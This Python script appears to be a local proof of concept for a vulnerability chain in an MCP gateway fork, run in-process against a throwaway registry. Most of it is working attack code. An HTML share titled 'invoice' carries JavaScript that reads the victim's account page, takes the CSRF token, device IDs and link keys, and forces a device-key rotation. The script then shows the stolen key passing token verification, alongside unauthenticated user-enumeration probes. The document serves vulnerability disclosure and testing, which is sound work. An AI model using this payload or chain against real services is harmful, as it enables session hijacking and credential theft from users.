"""Local, isolated PoC: share -> cabinet -> link_key -> re-bind chain.

Runs the fork's gateway in-process on this host with a throwaway registry.
No installation, no network egress, no third-party host is touched.
"""
import os
import re
import secrets
import sys
import tempfile
import time

repo = r"D:\tmp-rdmcp"
deps = r"D:\MyProjects\Antigravity-mash\.win-test-deps\py3.13"
sys.path.insert(0, repo)
sys.path.insert(0, deps)

tmp = tempfile.mkdtemp(prefix="rhm-local-poc-")
os.environ["MESH_REGISTRY_PATH"] = os.path.join(tmp, "registry.json")
os.environ["MESH_WEB_DIR"] = os.path.join(tmp, "web")
os.environ["MESH_PUBLIC_URL"] = "https://gw.test"
os.environ["MESH_GOOGLE_CLIENT_ID"] = "test-client"
os.environ["MESH_GOOGLE_CLIENT_SECRET"] = "test-secret"
os.environ["MESH_LEGACY_SUBDOMAIN"] = "0"
os.environ.pop("MESH_PRIVATE_HEALTH", None)

import gateway
import core.web_share as web_share
from starlette.requests import Request
from starlette.testclient import TestClient

BASE = "https://gw.test"
client = TestClient(gateway.app, base_url=BASE)


def line(title):
    print("\n=== %s ===" % title, flush=True)


def short(text, limit=300):
    return (text or "").replace("\n", " ")[:limit]


line("0. harness: seed two tenants and a victim cabinet session")
now = "2026-11-19T00:00:00+00:00"
reg = {
    "attacker": gateway.new_node_entry("", "Linux", "x64", now, gateway.new_device_token()),
    "victim": gateway.new_node_entry("", "Linux", "x64", now, gateway.new_device_token()),
}
reg["attacker"]["owner_subject"] = "google:attacker"
reg["victim"]["owner_subject"] = "google:victim"
gateway.save_registry(reg)
print("registry nodes:", sorted(reg), flush=True)

sid = secrets.token_urlsafe(32)
gateway.owner_auth.sessions[sid] = {
    "subject": "google:victim", "email": "victim@example.test",
    "csrf": "victim-csrf-token", "expires_at": time.time() + 3600,
}
victim = TestClient(gateway.app, base_url=BASE)
victim.cookies.set(gateway.owner_auth.SESSION_COOKIE, sid, domain="gw.test", path="/")
print("victim cookie:", gateway.owner_auth.SESSION_COOKIE, flush=True)

line("1. baseline: the victim's own cabinet exposes link keys")
account = victim.get("/account")
print("GET /account ->", account.status_code, flush=True)
keys_before = sorted(set(re.findall(r"token=(lk_[a-f0-9]+)", account.text or "")))
print("link keys in /account:", keys_before, flush=True)

line("2. enumeration primitives without a token")
ghost = client.get("/sse", params={"user": "ghost-node", "token": "x"})
known = client.get("/sse", params={"user": "victim", "token": "x"})
print("unknown user ->", ghost.status_code, short(ghost.text), flush=True)
print("known user   ->", known.status_code, short(known.text), flush=True)
print("share unknown ->", client.get("/ghost-node/share-0123456789abcdef/").status_code, flush=True)
print("share known   ->", client.get("/victim/share-0123456789abcdef/").status_code,
      short(client.get("/victim/share-0123456789abcdef/").text), flush=True)
health = client.get("/health").json()
print("health keys:", sorted(health), flush=True)
print("streams_per_user:", health.get("streams_per_user"), "events:", health.get("tunnel_events"), flush=True)

line("3. attacker publishes a malicious share through the fork's own code")
evil = os.path.join(tmp, "evil.html")
with open(evil, "w", encoding="utf-8") as fh:
    fh.write("""<!doctype html><meta charset="utf-8"><title>invoice</title>
<script>
(async () => {
  const html = await (await fetch('/account', {credentials: 'include'})).text();
  const csrf = (html.match(/name="csrf" value="([^"]+)"/) || [])[1];
  const dev = [...new Set([...html.matchAll(/\\/account\\/devices\\/([a-z0-9_-]+)\\/(?:check|rotate|revoke)/g)].map(m => m[1]))];
  const keys = [...html.matchAll(/token=(lk_[a-f0-9]+)/g)].map(m => m[1]);
  document.title = JSON.stringify({csrf, dev, keys});
  if (csrf && dev.length) {
    await fetch('/account/devices/' + dev[0] + '/rotate',
      {method: 'POST', credentials: 'include',
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: 'csrf=' + encodeURIComponent(csrf) + '&confirm=yes'});
    const after = await (await fetch('/account', {credentials: 'include'})).text();
    const fresh = [...after.matchAll(/token=(lk_[a-f0-9]+)/g)].map(m => m[1]);
    document.title = JSON.stringify({csrf, dev, keys, fresh});
  }
})();
</script>""")
published = web_share.share_file(evil, name="invoice")
print("share_file ->", {k: published.get(k) for k in ("slug", "url", "error")}, flush=True)
slug = published.get("slug", "")

gateway.active_tunnels["attacker"] = {"ws": object(), "pending": {}}


async def fake_call_remote_tool(user, name, args):
    if name == "_http_share":
        return web_share.handle_http_request(args)
    raise AssertionError("unexpected tool " + name)


gateway.call_remote_tool = fake_call_remote_tool

share_path = "/attacker/%s/evil.html" % slug
page = client.get(share_path)
print("GET", share_path, "->", page.status_code, flush=True)
print("content-type:", page.headers.get("content-type"))
for header in ("content-security-policy", "x-content-type-options", "content-disposition"):
    print("%s: %r" % (header, page.headers.get(header)))
print("script present:", "<script>" in (page.text or ""), flush=True)

line("4. victim opens the link: the requests the page's fetch() would make")
cab = victim.get("/account")
csrf = re.search(r'name="csrf" value="([^"]+)"', cab.text or "")
devices = sorted(set(re.findall(r"/account/devices/([a-z0-9_-]+)/(?:check|rotate|revoke)", cab.text or "")))
keys = sorted(set(re.findall(r"token=(lk_[a-f0-9]+)", cab.text or "")))
print("victim /account ->", cab.status_code, "csrf found:", bool(csrf), "devices:", devices, flush=True)
print("stolen link keys:", keys, flush=True)

line("5. re-bind the victim's device with the stolen CSRF, as the page does")
if csrf and devices:
    rotated = victim.post("/account/devices/%s/rotate" % devices[0],
                          data={"csrf": csrf.group(1), "confirm": "yes"},
                          follow_redirects=False)
    print("POST rotate ->", rotated.status_code, "location:", rotated.headers.get("location"), flush=True)
    after = victim.get("/account")
    fresh = sorted(set(re.findall(r"token=(lk_[a-f0-9]+)", after.text or "")))
    print("link key after rotate:", fresh, flush=True)
    print("old key retired:", not (set(fresh) & set(keys)), flush=True)

    line("6. attacker uses the stolen key against the gateway")
    stolen = fresh[0] if fresh else ""
    scope = {"type": "http", "method": "GET", "path": "/mcp",
             "query_string": ("user=victim&token=" + stolen).encode(),
             "headers": [], "scheme": "https", "server": ("gw.test", 443),
             "client": ("127.0.0.1", 1), "root_path": ""}
    print("verify_token(victim, stolen lk_) ->", gateway.verify_token(Request(scope)), flush=True)

line("7. negative control: the same rotate without the victim cookie")
anon = client.post("/account/devices/%s/rotate" % (devices[0] if devices else "victim"),
                   data={"csrf": "guessed", "confirm": "yes"}, follow_redirects=False)
print("anonymous rotate ->", anon.status_code, short(anon.text, 160), flush=True)

print("\nDONE (local only)", flush=True)
